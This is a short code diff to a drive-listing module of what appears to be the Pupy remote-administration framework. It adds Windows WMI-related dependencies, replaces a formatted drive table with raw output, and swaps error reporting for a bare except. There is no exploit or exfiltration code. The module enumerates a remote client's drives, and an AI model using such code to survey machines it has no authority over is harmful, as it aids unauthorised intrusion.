@@ -15,7 +15,8 @@ class Drives(PupyModule):
         'all': ['psutil'],
         'posix': ['mount'],
         'windows': [
-            'pupwinutils.drives', 'wql'
+            'win32api', 'win32com', 'pythoncom',
+            'winerror', 'wmi', 'pupwinutils.drives'
         ],
     }
 
@@ -166,18 +167,10 @@ class Drives(PupyModule):
         elif self.client.is_windows():
             try:
                 list_drives = self.client.remote('pupwinutils.drives', 'list_drives')
-                self.log(
-                    Table([{
-                        'Name': name,
-                        'Type': dtype,
-                        'Size': size,
-                        'Free': free,
-                        'UNC': unc
-                    } for name, dtype, size, free, unc in list_drives()
-                    ], ['Name', 'Type', 'Size', 'Free', 'UNC']))
+                self.log(list_drives())
                 ok = True
-            except Exception as e:
-                self.warning('WMI failed: {}'.format(e))
+            except:
+                self.warning('WMI failed')
                 pass
 
         if not ok:
